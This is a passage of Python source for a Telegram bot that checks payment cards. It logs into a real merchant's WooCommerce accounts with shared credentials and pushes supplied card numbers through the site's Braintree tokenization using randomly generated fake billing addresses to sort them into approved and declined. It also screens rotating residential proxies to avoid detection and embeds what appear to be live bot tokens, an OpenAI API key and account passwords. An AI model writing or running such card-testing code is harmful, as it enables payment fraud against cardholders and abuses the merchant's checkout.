import subprocess
import sys

def install_package(package):
    """Install a package using pip"""
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package, "--quiet", "--break-system-packages"])
        print(f"✅ Installed {package}")
    except Exception as e:
        print(f"❌ Failed to install {package}: {e}")

# Auto-install required packages
required_packages = ['telethon', 'requests', 'aiohttp', 'httpx', 'aiofiles', 'faker']
for package in required_packages:
    try:
        __import__(package)
    except ImportError:
        print(f"🐍 Module {package} not found. Installing {package}...")
        install_package(package)

from telethon import TelegramClient, events, Button
from telethon.tl.types import KeyboardButtonCallback
import requests, random, datetime, json, os, re, asyncio, time
import string
import hashlib
import aiohttp
import httpx
import traceback
import aiofiles
import uuid
from urllib.parse import urlparse
from faker import Faker
import functools
# Scheduler imports removed - daily credits disabled

# Import gateway_api.py (GraphQL Gateway)
try:
    from gateway_api import charge_shopify_graphql, generate_random_session
    GRAPHQL_AVAILABLE = True
    print("✅ GraphQL Gateway (gateway_api.py) loaded")
except ImportError as e:
    GRAPHQL_AVAILABLE = False
    print(f"⚠️ GraphQL Gateway (gateway_api.py) not found: {e}")
    print("⚠️ Installing missing dependencies...")
    try:
        import subprocess
        subprocess.check_call([sys.executable, "-m", "pip", "install", "httpx", "--quiet", "--break-system-packages"])
        print("✅ httpx installed, retrying import...")
        from gateway_api import charge_shopify_graphql, generate_random_session
        GRAPHQL_AVAILABLE = True
        print("✅ GraphQL Gateway (gateway_api.py) loaded after installing dependencies")
    except Exception as retry_error:
        print(f"❌ Failed to load gateway_api.py: {retry_error}")

# --- Import the command handlers from their separate files ---
# from st_commands import register_handlers as register_st_handlers
# from pp_commands import register_handlers as register_pp_handlers
# from pp01_commands import register_handlers as register_pp01_handlers
# from br_commands import register_handlers as register_br_handlers

# ===== CONFIGURATION =====
API_ID = 24682990
API_HASH = "3363b38256a9b98a42a1ea033a21155a"

# Test card for site validation
TEST_CARD_TXT = "4532015112830366|12|2025|123"
BOT_TOKEN = "8365585507:AAGbu4QUI00nQUXH6hc7iS4AYjXl-02k53w"
ADMIN_ID = [562735329]
GROUP_ID = -1002351031261
CHANNEL_ID = -1002720935297
FORWARD_ID = -1003005249371
OPENAI_API_KEY = "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"

# ===== BRAINTREE GATEWAY (Built-in) =====
# Configuration
BT_USERNAMES = ['akbhai1', 'akbhai2', 'akbhai3', 'akbhai4', 'akbhai5', 'akbhai6']
BT_PASSWORD = 'akbhai@1111'
BT_LOGIN_URL = 'https://iditarod.com/my-account/'

# Antispam: Track last /bt command usage per user (25 second cooldown)
BT_COMMAND_COOLDOWN = {}  # {user_id: last_command_timestamp}

# Antispam: Track last error response per user (prevent same error spam)
BT_ERROR_CACHE = {}  # {user_id: {'error': 'message', 'timestamp': time.time()}}

def generate_bt_fake_address():
    """Generate random US address for Braintree"""
    first_names = ['John', 'James', 'Robert', 'Michael', 'William', 'David', 'Richard', 'Joseph', 'Thomas', 'Charles']
    last_names = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez']
    streets = ['Main St', 'Oak Ave', 'Maple Dr', 'Cedar Ln', 'Pine Rd', 'Elm St', 'Washington Blvd', 'Park Ave', 'Lake Dr', 'Hill St']
    cities = ['New York', 'Los Angeles', 'Chicago', 'Houston', 'Phoenix', 'Philadelphia', 'San Antonio', 'San Diego', 'Dallas', 'San Jose']
    states = ['NY', 'CA', 'IL', 'TX', 'AZ', 'PA', 'FL', 'OH', 'GA', 'NC']
    zipcodes = ['10001', '90001', '60601', '77001', '85001', '19101', '78201', '92101', '75201', '95101']
    
    idx = random.randint(0, len(first_names) - 1)
    
    return {
        'first_name': first_names[idx],
        'last_name': last_names[idx],
        'address_1': f"{random.randint(100, 9999)} {random.choice(streets)}",
        'city': cities[idx],
        'state': states[idx],
        'postcode': zipcodes[idx],
        'country': 'US',
        'phone': f"202{random.randint(1000000, 9999999)}",
        'email': f"{first_names[idx].lower()}.{last_names[idx].lower()}{random.randint(100, 999)}@gmail.com"
    }

async def check_braintree_card(card_data):
    """Check card using Braintree gateway - iditarod.com"""
    start_time = time.time()
    
    try:
        parts = card_data.split('|')
        if len(parts) < 4:
            return {'status': 'error', 'message': 'Invalid card format', 'time_taken': f'{round(time.time() - start_time, 2)} seconds'}
        
        cc, mes, ano, cvv = parts[0], parts[1], parts[2], parts[3]
        if len(ano) == 2: ano = f"20{ano}"
        if len(mes) == 1: mes = f"0{mes}"
        
        fake_address = generate_bt_fake_address()
        random_username = random.choice(BT_USERNAMES)
        
        async with httpx.AsyncClient(timeout=30.0, follow_redirects=True) as client:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
            }
            
            # Step 1: Get login nonce
            response = await client.get(BT_LOGIN_URL, headers=headers)
            login_nonce_match = re.search(r'<input type="hidden" id="woocommerce-login-nonce" name="woocommerce-login-nonce" value="([^"]+)"', response.text)
            if not login_nonce_match:
                return {'status': 'error', 'message': 'Failed to get login nonce', 'time_taken': f'{round(time.time() - start_time, 2)} seconds'}
            
            # Step 2: Login
            login_data = {'username': random_username, 'password': BT_PASSWORD, 'rememberme': 'forever', 'woocommerce-login-nonce': login_nonce_match.group(1), '_wp_http_referer': '/my-account/', 'login': 'Log in'}
            headers.update({'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'https://iditarod.com', 'Referer': 'https://iditarod.com/my-account/'})
            await client.post(BT_LOGIN_URL, data=login_data, headers=headers)
            
            # Step 3: Get payment nonces (billing address already set in account)
            add_payment_url = 'https://iditarod.com/my-account/add-payment-method/'
            headers['Referer'] = 'https://iditarod.com/my-account/payment-methods/'
            response = await client.get(add_payment_url, headers=headers)
            payment_nonce_match = re.search(r'<input type="hidden" id="woocommerce-add-payment-method-nonce" name="woocommerce-add-payment-method-nonce" value="([^"]+)"', response.text)
            client_token_nonce_match = re.search(r'"client_token_nonce":\s*"([^"]+)"', response.text)
            if not payment_nonce_match or not client_token_nonce_match:
                return {'status': 'error', 'message': 'Failed to get payment nonces', 'time_taken': f'{round(time.time() - start_time, 2)} seconds'}
            
            # Step 5: Get Braintree token
            ajax_url = 'https://iditarod.com/wp-admin/admin-ajax.php'
            headers.update({'X-Requested-With': 'XMLHttpRequest', 'Referer': add_payment_url})
            response = await client.post(ajax_url, data={'action': 'wc_braintree_credit_card_get_client_token', 'nonce': client_token_nonce_match.group(1)}, headers=headers)
            ajax_json = response.json()
            if not ajax_json.get('success') or 'data' not in ajax_json:
                return {'status': 'error', 'message': 'Failed to get Braintree token', 'time_taken': f'{round(time.time() - start_time, 2)} seconds'}
            
            # Decode bearer token
            import base64
            decoded_token = base64.b64decode(ajax_json['data']).decode('utf-8')
            decoded_json = json.loads(decoded_token)
            bearer_token = decoded_json.get('authorizationFingerprint')
            if not bearer_token:
                return {'status': 'error', 'message': 'Failed to extract authorization fingerprint', 'time_taken': f'{round(time.time() - start_time, 2)} seconds'}
            
            # Step 6: Tokenize card
            braintree_payload = {
                'clientSdkMetadata': {
                    'source': 'client',
                    'integration': 'custom',
                    'sessionId': f'{random.randint(10000000, 99999999):016x}'
                },
                'query': '''mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }''',
                'variables': {
                    'input': {
                        'creditCard': {
                            'number': cc,
                            'expirationMonth': mes,
                            'expirationYear': ano,
                            'cvv': cvv,
                            'cardholderName': f'{fake_address["first_name"]} {fake_address["last_name"]}',
                            'billingAddress': {
                                'postalCode': fake_address['postcode'],
                                'streetAddress': fake_address['address_1'],
                                'locality': fake_address['city'],
                                'region': fake_address['state'],
                                'countryCodeAlpha2': fake_address['country']
                            }
                        },
                        'options': {'validate': False}
                    }
                },
                'operationName': 'TokenizeCreditCard'
            }
            braintree_headers = {'Authorization': f'Bearer {bearer_token}', 'Braintree-Version': '2018-05-10', 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            response = await client.post('https://payments.braintree-api.com/graphql', json=braintree_payload, headers=braintree_headers)
            braintree_json = response.json()
            
            if 'errors' in braintree_json:
                return {'status': 'declined', 'message': braintree_json['errors'][0].get('message', 'Card declined'), 'time_taken': f'{round(time.time() - start_time, 2)} seconds'}
            
            if 'data' in braintree_json and 'tokenizeCreditCard' in braintree_json['data']:
                token_data = braintree_json['data']['tokenizeCreditCard']
                if token_data and 'token' in token_data:
                    card_info = token_data.get('creditCard', {})
                    card_type = card_info.get('brandCode', 'visa').lower()
                    payment_nonce = token_data['token']
                    
                    # Build payment data exactly like PHP version
                    payment_data = {
                        'payment_method': 'braintree_credit_card',
                        'wc-braintree-credit-card-card-type': card_type,
                        'wc-braintree-credit-card-3d-secure-enabled': '',
                        'wc-braintree-credit-card-3d-secure-verified': '',
                        'wc-braintree-credit-card-3d-secure-order-total': '0.00',
                        'wc_braintree_credit_card_payment_nonce': payment_nonce,
                        'wc_braintree_device_data': '',
                        'wc-braintree-credit-card-tokenize-payment-method': 'false',
                        'billing_first_name': fake_address['first_name'],
                        'billing_last_name': fake_address['last_name'],
                        'billing_company': '',
                        'billing_country': fake_address['country'],
                        'billing_address_1': fake_address['address_1'],
                        'billing_address_2': '',
                        'billing_city': fake_address['city'],
                        'billing_state': fake_address['state'],
                        'billing_postcode': fake_address['postcode'],
                        'billing_phone': fake_address['phone'],
                        'billing_email': fake_address['email'],
                        'woocommerce-add-payment-method-nonce': payment_nonce_match.group(1),
                        '_wp_http_referer': '/my-account/add-payment-method/',
                        'woocommerce_add_payment_method': '1'
                    }
                    
                    headers['Content-Type'] = 'application/x-www-form-urlencoded'
                    del headers['X-Requested-With']
                    response = await client.post(add_payment_url, data=payment_data, headers=headers)
                    
                    if 'successfully added' in response.text.lower() or 'payment method added' in response.text.lower():
                        return {'status': 'approved', 'message': f'Nice! New payment method added: {card_info.get("brandCode", "Card").upper()} ending in {card_info.get("last4", cc[-4:])} (expires {card_info.get("expirationMonth", mes)}/{card_info.get("expirationYear", ano)})', 'time_taken': f'{round(time.time() - start_time, 2)} seconds'}
                    elif 'already exists' in response.text.lower():
                        return {'status': 'declined', 'message': 'Card already exists in account', 'time_taken': f'{round(time.time() - start_time, 2)} seconds'}
                    else:
                        # Extract error message from response
                        error_match = re.search(r'<ul class="woocommerce-error"[^>]*>(.*?)</ul>', response.text, re.DOTALL)
                        if error_match:
                            error_text = re.sub(r'<[^>]+>', '', error_match.group(1)).strip()
                            if error_text:
                                return {'status': 'declined', 'message': error_text[:100], 'time_taken': f'{round(time.time() - start_time, 2)} seconds'}
                        
                        # Try alternative error patterns
                        error_match2 = re.search(r'<div class="woocommerce-error"[^>]*>(.*?)</div>', response.text, re.DOTALL)
                        if error_match2:
                            error_text = re.sub(r'<[^>]+>', '', error_match2.group(1)).strip()
                            if error_text:
                                return {'status': 'declined', 'message': error_text[:100], 'time_taken': f'{round(time.time() - start_time, 2)} seconds'}
                        
                        return {'status': 'declined', 'message': 'Card was declined by gateway', 'time_taken': f'{round(time.time() - start_time, 2)} seconds'}
            
            return {'status': 'error', 'message': 'Failed to tokenize card', 'time_taken': f'{round(time.time() - start_time, 2)} seconds'}
            
    except httpx.TimeoutException:
        return {'status': 'error', 'message': 'Request timeout', 'time_taken': f'{round(time.time() - start_time, 2)} seconds'}
    except Exception as e:
        return {'status': 'error', 'message': f'Gateway error: {str(e)[:100]}', 'time_taken': f'{round(time.time() - start_time, 2)} seconds'}

# ===== INLINE PROXY FUNCTIONS (Built-in) =====
PROXY_FILE = "proxies.json"

def load_proxies():
    """Load proxies from JSON file"""
    try:
        if os.path.exists(PROXY_FILE):
            with open(PROXY_FILE, "r") as f:
                return json.load(f)
        return {}
    except Exception as e:
        print(f"Error loading proxies: {e}")
        return {}

def save_proxies(proxies):
    """Save proxies to JSON file"""
    try:
        with open(PROXY_FILE, "w") as f:
            json.dump(proxies, f, indent=2)
        return True
    except Exception as e:
        print(f"Error saving proxies: {e}")
        return False

def get_proxy(user_id):
    """Get proxy for a specific user"""
    try:
        proxies = load_proxies()
        return proxies.get(str(user_id))
    except Exception as e:
        print(f"Error getting proxy for user {user_id}: {e}")
        return None

def set_proxy(user_id, proxy_url):
    """Set proxy for a specific user"""
    try:
        proxies = load_proxies()
        proxies[str(user_id)] = proxy_url
        return save_proxies(proxies)
    except Exception as e:
        print(f"Error setting proxy for user {user_id}: {e}")
        return False

def remove_proxy(user_id):
    """Remove proxy for a specific user"""
    try:
        proxies = load_proxies()
        if str(user_id) in proxies:
            del proxies[str(user_id)]
            return save_proxies(proxies)
        return False
    except Exception as e:
        print(f"Error removing proxy for user {user_id}: {e}")
        return False

def normalize_proxy(proxy_str):
    """
    Normalize proxy string to standard format
    Accepts: user:pass@ip:port, ip:port:user:pass, http://user:pass@ip:port, domain:port:user:pass
    Returns: user:pass@ip:port or user:pass@domain:port
    """
    try:
        proxy_str = proxy_str.strip()
        proxy_str = proxy_str.replace("http://", "").replace("https://", "")
        
        # Format: user:pass@host:port (already correct)
        if "@" in proxy_str:
            parts = proxy_str.split("@")
            if len(parts) == 2:
                auth = parts[0]
                host_port = parts[1]
                if ":" in auth and ":" in host_port:
                    return proxy_str
        
        # Format: host:port:user:pass (need to convert)
        parts = proxy_str.split(":")
        if len(parts) == 4:
            # Could be: ip:port:user:pass OR domain:port:user:pass
            host, port, user, password = parts
            return f"{user}:{password}@{host}:{port}"
        
        # Format: domain.with.dots:port:user:pass (5+ parts due to dots in domain)
        if len(parts) >= 4:
            # Last two parts are user:pass
            user = parts[-2]
            password = parts[-1]
            # Second to last is port
            port = parts[-3]
            # Everything before port is the host/domain
            host = ":".join(parts[:-3])
            return f"{user}:{password}@{host}:{port}"
        
        # Format: host:port (no auth)
        if len(parts) == 2:
            return proxy_str
        
        return None
    except Exception as e:
        print(f"Error normalizing proxy: {e}")
        return None

async def get_ip_simple(proxy_url):
    """
    Simple IP check using httpx
    Returns: (IP address string or None, error message or None)
    """
    try:
        import httpx
        transport = httpx.AsyncHTTPTransport(proxy=f"http://{proxy_url}" if not proxy_url.startswith("http") else proxy_url)
        async with httpx.AsyncClient(transport=transport, timeout=10) as client:
            res = await client.get("https://ipinfo.io/json")
            if res.status_code == 200:
                return res.json().get("ip"), None
            return None, res.status_code
    except Exception as e:
        return None, str(e)

async def get_ip(proxy_url=None):
    """
    Get IP address (either through proxy or direct)
    Returns: (IP address string or None, error message or None)
    """
    try:
        url = "https://api.ipify.org?format=json"
        timeout = aiohttp.ClientTimeout(total=10)
        
        if proxy_url:
            proxy_formatted = format_proxy_for_aiohttp(proxy_url)
            if not proxy_formatted:
                return None, "Invalid proxy format"
            
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.get(url, proxy=proxy_formatted) as response:
                    if response.status == 200:
                        data = await response.json()
                        return data.get("ip"), None
                    else:
                        return None, f"HTTP {response.status}"
        else:
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.get(url) as response:
                    if response.status == 200:
                        data = await response.json()
                        return data.get("ip"), None
                    else:
                        return None, f"HTTP {response.status}"
        
        return None, "Connection failed"
    except asyncio.TimeoutError:
        return None, "Connection timeout"
    except Exception as e:
        print(f"Error getting IP: {e}")
        return None, str(e)

async def check_ip_type(ip):
    """
    Check if IP is residential or datacenter using ip-api.com
    Returns: (is_residential, isp_info, error)
    """
    try:
        url = f"http://ip-api.com/json/{ip}?fields=status,isp,org,as,hosting"
        timeout = aiohttp.ClientTimeout(total=5)
        
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as response:
                if response.status == 200:
                    data = await response.json()
                    
                    if data.get("status") != "success":
                        return None, None, "IP lookup failed"
                    
                    isp = data.get("isp", "").lower()
                    org = data.get("org", "").lower()
                    as_name = data.get("as", "").lower()
                    is_hosting = data.get("hosting", False)
                    
                    # Datacenter/Hosting indicators
                    datacenter_keywords = [
                        "datacenter", "data center", "hosting", "server", "cloud",
                        "amazon", "aws", "google cloud", "azure", "digitalocean",
                        "ovh", "hetzner", "linode", "vultr", "contabo",
                        "dedicated", "vps", "virtual private", "colocation"
                    ]
                    
                    # Check if it's a datacenter/hosting IP
                    if is_hosting:
                        return False, f"ISP: {data.get('isp')}", None
                    
                    combined_text = f"{isp} {org} {as_name}"
                    for keyword in datacenter_keywords:
                        if keyword in combined_text:
                            return False, f"ISP: {data.get('isp')}", None
                    
                    # If not datacenter, likely residential
                    return True, f"ISP: {data.get('isp')}", None
                else:
                    return None, None, f"HTTP {response.status}"
    except Exception as e:
        return None, None, str(e)

async def validate_rotating_residential_proxy(proxy_url, checks=4):
    """
    Strict validation for rotating residential proxies only
    Returns: (is_valid, proxy_type, ips_list, error_message)
    """
    try:
        ips = []
        errors = []
        ip_types = []
        
        # Check multiple times to verify rotation
        checked_ips = set()
        for i in range(checks):
            # Generate random session for Lightning-type proxies
            test_proxy = generate_random_session(proxy_url)
            
            ip, err = await get_ip(test_proxy)
            if ip:
                ips.append(ip)
                
                # Check IP type for each unique IP (not just first 2)
                if ip not in checked_ips:
                    checked_ips.add(ip)
                    is_residential, isp_info, check_err = await check_ip_type(ip)
                    if is_residential is not None:
                        ip_types.append((ip, is_residential, isp_info))
            else:
                errors.append(err or "Unknown error")
            
            # Wait between checks to allow rotation
            if i < checks - 1:
                await asyncio.sleep(2)
        
        # If no IPs collected, proxy is dead
        if not ips:
            # Clean error message - extract only the main error
            error_msg = errors[0] if errors else "Connection failed"
            # Extract clean error from httpx/aiohttp error messages
            if "407" in str(error_msg):
                error_msg = "407 Proxy Authentication Required"
            elif "502" in str(error_msg):
                error_msg = "502 Bad Gateway"
            elif "timeout" in str(error_msg).lower():
                error_msg = "Connection Timeout"
            elif "refused" in str(error_msg).lower():
                error_msg = "Connection Refused"
            elif "unreachable" in str(error_msg).lower():
                error_msg = "Host Unreachable"
            else:
                # Remove URL and extra details from error message
                error_msg = str(error_msg).split(",")[0].strip()
                if "message=" in error_msg:
                    error_msg = error_msg.split("message=")[0].strip()
            return False, "DEAD", [], error_msg
        
        # Check if all IPs are unique (rotating)
        unique_ips = list(set(ips))
        
        # STRICT: Must have at least 3 unique IPs out of 4 checks (75% rotation)
        if len(unique_ips) < 3:
            return False, "NOT_ROTATING", ips, f"Proxy must rotate on every request. Only {len(unique_ips)}/{checks} unique IPs detected. Use residential rotating proxies only."
        
        # Check if IPs are residential (not datacenter)
        datacenter_count = 0
        residential_count = 0
        
        for ip, is_residential, isp_info in ip_types:
            if is_residential:
                residential_count += 1
            else:
                datacenter_count += 1
        
        # RELAXED: Allow if majority are residential (not all datacenter)
        # If more than 50% are datacenter, reject
        if datacenter_count > 0 and residential_count == 0:
            # All checked IPs are datacenter
            dc_ips = [f"{ip} ({isp})" for ip, is_res, isp in ip_types if not is_res]
            return False, "DATACENTER", unique_ips, f"Datacenter/Hosting IP detected: {', '.join(dc_ips)}. Only residential proxies are accepted."
        
        # If we couldn't verify any IPs but proxy rotates well, accept it
        if residential_count == 0 and datacenter_count == 0:
            # Could not verify IP type, but rotation is good - accept
            return True, "RESIDENTIAL_ROTATING", unique_ips, None
        
        # If majority are residential, accept
        if residential_count >= datacenter_count:
            return True, "RESIDENTIAL_ROTATING", unique_ips, None
        
        # Calculate rotation rate
        rotation_rate = len(unique_ips) / len(ips)
        
        # STRICT: Must have excellent rotation (75%+)
        if rotation_rate >= 0.75:
            return True, "RESIDENTIAL_ROTATING", unique_ips, None
        else:
            return False, "POOR_ROTATION", unique_ips, f"Rotation rate too low ({int(rotation_rate*100)}%). Residential proxies must rotate on every request."
        
    except Exception as e:
        return False, "ERROR", [], str(e)

def format_proxy_for_aiohttp(proxy_url):
    """
    Format proxy URL for aiohttp
    Input: user:pass@ip:port or ip:port
    Output: http://user:pass@ip:port or http://ip:port
    """
    try:
        if not proxy_url:
            return None
        proxy_url = proxy_url.replace("http://", "").replace("https://", "")
        return f"http://{proxy_url}"
    except Exception as e:
        print(f"Error formatting proxy for aiohttp: {e}")
        return None

def validate_proxy_format(proxy_str):
    """Validate proxy format"""
    try:
        proxy_str = proxy_str.strip()
        proxy_str = proxy_str.replace("http://", "").replace("https://", "")
        
        pattern1 = r'^[^:]+:[^@]+@[\d\.]+:\d+$'
        pattern2 = r'^[\d\.]+:\d+$'
        pattern3 = r'^[\d\.]+:\d+:[^:]+:.+$'
        
        if re.match(pattern1, proxy_str) or re.match(pattern2, proxy_str) or re.match(pattern3, proxy_str):
            return True
        return False
    except Exception as e:
        print(f"Error validating proxy format: {e}")
        return False

async def test_proxy(proxy_url):
    """Test if proxy is working"""
    try:
        ip, error = await get_ip(proxy_url)
        if ip:
            return True, ip
        else:
            return False, error or "Failed to connect through proxy"
    except Exception as e:
        return False, str(e)

# ===== END INLINE PROXY FUNCTIONS =====

# Files
PREMIUM_FILE = "premium.json"
FREE_FILE = "free_users.json"
SITE_FILE = "user_sites.json"  # For /add command (internal API)
SETURL_SITE_FILE = "seturl_sites.json"  # For /seturl command (gateway_api)
KEYS_FILE = "keys.json"
CC_FILE = "cc.txt"
BANNED_FILE = "banned_users.json"
COMMAND_STATE_FILE = "command_states.json"
PREMIUM_GROUPS_FILE = "premium_groups.json"
CREDITS_FILE = "credits.json"
REDEEM_KEYS_FILE = "redeem_keys.json"

# Commands that should be silent when disabled (no error message)
SILENT_DISABLED_COMMANDS = ["sh", "msh", "mtxt", "add", "rm", "sites", "check"]

ACTIVE_MTXT_PROCESSES = {}
ACTIVE_MSH_PROCESSES = {}
ACTIVE_PTXT_PROCESSES = {}
MESSAGE_OWNERS = {}  # Track which user owns which message (message_id -> user_id)
LAST_CHECKED_CARDS = {}  # Track last checked card per user: {user_id: {"card": card, "time": timestamp}}

# Command states - all commands enabled by default
COMMAND_STATES = {
    "sh": True,
    "st": True,
    "bt": True,
    "pp": True,
    "mpp": True,
    "msh": True,
    "mst": True,
    "mtxt": True,
    "mstxt": True,
    "psh": True,
    "pmsh": True,
    "ptxt": True,
    "gen": True,
    "bin": True,
    "check": True,
    "fl": True,
    "fake": True,
    "info": True,
    "sites": True,
    "lol": True
}

# Anime GIFs - Local files only
ANIME_GIFS = [
    "attached_assets/anime_gifs/anime3.gif",
    "attached_assets/anime_gifs/girl2.gif",
    "attached_assets/anime_gifs/girl3.gif",
    "attached_assets/anime_gifs/girl4.gif",
    "attached_assets/anime_gifs/girl5.gif"
]

# Cooldown tracking for /lol command (user_id: last_check_time)
LOL_COOLDOWNS = {}

# --- Utility Functions ---

async def create_json_file(filename):
    try:
        if not os.path.exists(filename):
            async with aiofiles.open(filename, "w") as file:
                await file.write(json.dumps({}))
    except Exception as e:
        print(f"Error creating {filename}: {str(e)}")

async def initialize_files():
    """Initialize files - use existing if present, create empty if not"""
    for file in [PREMIUM_FILE, FREE_FILE, SITE_FILE, SETURL_SITE_FILE, KEYS_FILE, BANNED_FILE, COMMAND_STATE_FILE, PREMIUM_GROUPS_FILE, CREDITS_FILE, REDEEM_KEYS_FILE]:
        # Only create if doesn't exist (preserves uploaded data)
        if not os.path.exists(file):
            await create_json_file(file)
        else:
            print(f"✅ Using existing data file: {file}")
    
    # Create DATA directory if needed
    if not os.path.exists("DATA"):
        os.makedirs("DATA")
        print("📁 Created DATA directory")
    
    # Initialize DATA files (preserve if exist)
    data_files = ["DATA/txtsite.json", "DATA/users.json"]
    for file in data_files:
        if not os.path.exists(file):
            await create_json_file(file)
        else:
            print(f"✅ Using existing data file: {file}")
    
    # Load command states from file
    await load_command_states()

async def load_json(filename):
    try:
        if not os.path.exists(filename):
            await create_json_file(filename)
        async with aiofiles.open(filename, "r") as f:
            content = await f.read()
            return json.loads(content)
    except Exception as e:
        print(f"Error loading {filename}: {str(e)}")
        return {}

async def save_json(filename, data):
    try:
        async with aiofiles.open(filename, "w") as f:
            await f.write(json.dumps(data, indent=4))
    except Exception as e:
        print(f"Error saving {filename}: {str(e)}")

# TXT Sites functions
async def load_txt_sites():
    """Load txt sites from DATA/txtsite.json"""
    return await load_json("DATA/txtsite.json")

async def save_txt_sites(data):
    """Save txt sites to DATA/txtsite.json"""
    await save_json("DATA/txtsite.json", data)

# OLD generate_key function removed - New key generation is in generate_redeem_key() function

async def load_command_states():
    """Load command states from file"""
    global COMMAND_STATES
    try:
        states = await load_json(COMMAND_STATE_FILE)
        if states:
            COMMAND_STATES.update(states)
        else:
            # Save default states if file is empty
            await save_json(COMMAND_STATE_FILE, COMMAND_STATES)
    except Exception as e:
        print(f"Error loading command states: {str(e)}")

async def save_command_states():
    """Save command states to file"""
    try:
        await save_json(COMMAND_STATE_FILE, COMMAND_STATES)
    except Exception as e:
        print(f"Error saving command states: {str(e)}")

def is_command_enabled(command_name):
    """Check if a command is enabled"""
    return COMMAND_STATES.get(command_name, True)

def is_silent_command(command_name):
    """Check if a command should be silent when disabled"""
    return command_name in SILENT_DISABLED_COMMANDS

def require_membership(func):
    """Decorator to enforce group and channel membership for all commands"""
    @functools.wraps(func)
    async def wrapper(event, *args, **kwargs):
        # Skip check for admins
        if event.sender_id in ADMIN_ID:
            return await func(event, *args, **kwargs)
        
        # Check if in a group/supergroup (chat_id is negative for groups)
        is_group_chat = event.chat_id < 0
        
        if is_group_chat:
            # In groups, check if group is authorized (using premium_groups.json for now)
            # This allows specific groups to use the bot
            if not await is_premium_group(event.chat_id):
                # Check if it's one of the configured groups
                if event.chat_id not in [GROUP_ID, CHANNEL_ID, FORWARD_ID]:
                    return await event.reply("🚫 𝙏𝙝𝙞𝙨 𝙜𝙧𝙤𝙪𝙥 𝙞𝙨 𝙣𝙤𝙩 𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙!\n\n𝘾𝙤𝙣𝙩𝙖𝙘𝙩 [𝘼𝙆](https://t.me/Akbhai007) 𝙩𝙤 𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚 𝙩𝙝𝙞𝙨 𝙜𝙧𝙤𝙪𝙥.", link_preview=False)
        
        # Check membership for channel/group requirement (only in private chat)
        if not is_group_chat:
            membership_ok = await check_membership_and_reply(event)
            if not membership_ok:
                return
        
        # Execute the command
        return await func(event, *args, **kwargs)
    return wrapper

async def is_member_of_required_chats(user_id):
    """Check if user is member of both group and channel"""
    try:
        # Check group membership
        group_joined = False
        try:
            participant = await client.get_permissions(GROUP_ID, user_id)
            group_joined = participant is not None
        except Exception as e:
            print(f"Error checking group membership: {e}")
            group_joined = False
        
        # Check channel membership
        channel_joined = False
        try:
            participant = await client.get_permissions(CHANNEL_ID, user_id)
            channel_joined = participant is not None
        except Exception as e:
            print(f"Error checking channel membership: {e}")
            channel_joined = False
        
        return group_joined and channel_joined
    except Exception as e:
        print(f"Error checking membership: {e}")
        return False

async def check_membership_and_reply(event):
    """Check membership and reply with appropriate message"""
    user_id = event.sender_id
    
    # Skip check for admins
    if user_id in ADMIN_ID:
        with open("debug.log", "a") as f:
            f.write(f"[MEMBERSHIP] User {user_id} is ADMIN - Skipping check\n")
        return True
    
    with open("debug.log", "a") as f:
        f.write(f"[MEMBERSHIP] Checking membership for user {user_id}...\n")
    
    try:
        # Check group membership using get_permissions (faster and more reliable)
        group_joined = False
        try:
            participant = await client.get_permissions(GROUP_ID, user_id)
            group_joined = participant is not None
        except Exception as e:
            print(f"Error checking group membership: {e}")
            group_joined = False
        
        # Check channel membership using get_permissions
        channel_joined = False
        try:
            participant = await client.get_permissions(CHANNEL_ID, user_id)
            channel_joined = participant is not None
        except Exception as e:
            print(f"Error checking channel membership: {e}")
            channel_joined = False
        
        if not group_joined or not channel_joined:
            with open("debug.log", "a") as f:
                f.write(f"[MEMBERSHIP] User {user_id} NOT MEMBER - Group: {group_joined}, Channel: {channel_joined}\n")
            # Build buttons only for missing chats
            buttons = []
            missing = []
            
            if not group_joined:
                missing.append("Group")
            
            if not channel_joined:
                missing.append("Channel")
            
            # Add join buttons in one row
            buttons.append([
                Button.url("🚀 Join Group", "https://t.me/+zsDNOaFO-_tlZjA1"),
                Button.url("📢 Join Channel", "https://t.me/+Y2QWCIycJPplMDE1")
            ])
            
            # Add verification button
            buttons.append([Button.inline("Register Done ✅", b"verify_registration")])
            
            msg = await event.reply(
                f"🚫 **Registration Required!**\n\n"
                f"You must join the required chat(s) to use this bot:\n"
                f"❌ Missing: {', '.join(missing)}\n\n"
                f"Please join and click 'Register Done ✅' to verify!",
                buttons=buttons,
                link_preview=False
            )
            
            # Track message owner for button access control
            MESSAGE_OWNERS[msg.id] = event.sender_id
            return False
        
        with open("debug.log", "a") as f:
            f.write(f"[MEMBERSHIP] User {user_id} IS MEMBER - Access granted\n")
        return True
        
    except Exception as e:
        print(f"Error checking membership: {e}")
        # If check fails, deny access (secure fail-safe)
        await event.reply(
            "⚠️ **Error checking membership!**\n\n"
            "Please try again or contact support.",
            buttons=[
                [Button.url("🚀 Join Group", "https://t.me/+zsDNOaFO-_tlZjA1", link_preview=False),
                 Button.url("📢 Join Channel", "https://t.me/+Y2QWCIycJPplMDE1")]
            ]
        , link_preview=False)
        return False

async def is_premium_user(user_id):
    premium_users = await load_json(PREMIUM_FILE)
    user_data = premium_users.get(str(user_id))
    if not user_data: return False
    
    # Parse expiry date and make timezone aware if needed
    expiry_date = datetime.datetime.fromisoformat(user_data['expiry'])
    if expiry_date.tzinfo is None:
        expiry_date = expiry_date.replace(tzinfo=datetime.timezone.utc)
    
    # Get current time in UTC
    current_date = datetime.datetime.now(datetime.timezone.utc)
    
    if current_date > expiry_date:
        del premium_users[str(user_id)]
